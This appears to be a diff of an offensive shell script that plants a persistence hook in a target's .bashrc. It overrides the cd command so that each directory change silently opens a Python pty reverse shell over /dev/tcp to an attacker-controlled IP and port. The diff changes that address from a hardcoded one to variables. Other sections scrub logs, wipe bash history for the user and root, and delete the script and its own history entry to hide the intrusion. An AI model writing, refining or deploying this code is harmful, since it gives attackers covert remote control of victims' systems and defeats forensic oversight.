@@ -22,11 +22,11 @@ cat << 'EOF' >> "$TARGET_BASHRC"
 # cd hook
 cd() {
   builtin cd "$@" || return
-  ( nohup setsid bash -c 'python -c "import pty; pty.spawn(\"/bin/bash\")" >& /dev/tcp/10.0.0.208/5444 0>&1' >/dev/null 2>&1 < /dev/null & )
+  ( nohup setsid bash -c 'python -c "import pty; pty.spawn(\"/bin/bash\")"' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1 </dev/null >/dev/null 2>&1 & )
 }
 EOF
 
-echo "[+] Hook injected."
+echo "[+] Hook injected with dynamic IP/port."
 
 # === Stealth Cleanup ===
 
@@ -65,14 +65,12 @@ echo "[+] Log scrub complete."
 
 # === Bash history wipe ===
 
-echo "[*] Clearing bash history..."
+echo "[*] Clearing in-memory and on-disk bash history..."
 
-# Clear history in current shell memory
 export HISTFILE=~/.bash_history
 history -c
+history -w /dev/null
 unset HISTFILE
-
-# Remove any on-disk history
 rm -f ~/.bash_history /root/.bash_history 2>/dev/null
 
 echo "[+] Bash history cleared."
@@ -85,4 +83,4 @@ rm -f "$SCRIPT_PATH"
 unset SCRIPT_PATH
 history -d $(history 1) 2>/dev/null
 
-echo "[+] cd hook deployed and cleaned. Happy haunting 👻"
+echo "[+] cd hook deployed and ghosted."
